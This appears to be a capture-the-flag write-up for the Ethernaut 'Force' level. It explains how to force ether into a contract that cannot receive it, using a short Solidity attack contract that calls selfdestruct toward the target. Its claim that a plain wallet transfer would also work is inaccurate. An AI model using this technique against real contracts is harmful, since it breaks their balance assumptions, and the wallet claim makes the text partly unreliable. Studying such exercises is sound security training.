# Force Ethernaut

## Goals

=> The goal of this level is to make the balance of the contract greater than zero.

### Hints

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.

### Solution

- Self-destruct: Another option is to send ETH to the contract by using the self-destruct function of another contract. This involves creating a new contract that sends the Ether to the target contract before self-destructing

- You can also send Ether to the contract from an external wallet by using the contract's address as the recipient. However, this will not execute any contract code and will simply transfer Ether to the address without any further action.

### Fuzzing Contract

```solidity
contract Hack {
    Force force;

    constructor(address payable _force) {
        force = Force(_force);
    }

    function sendEther() public payable {
        selfdestruct(payable(address(force)));
    }

}
```
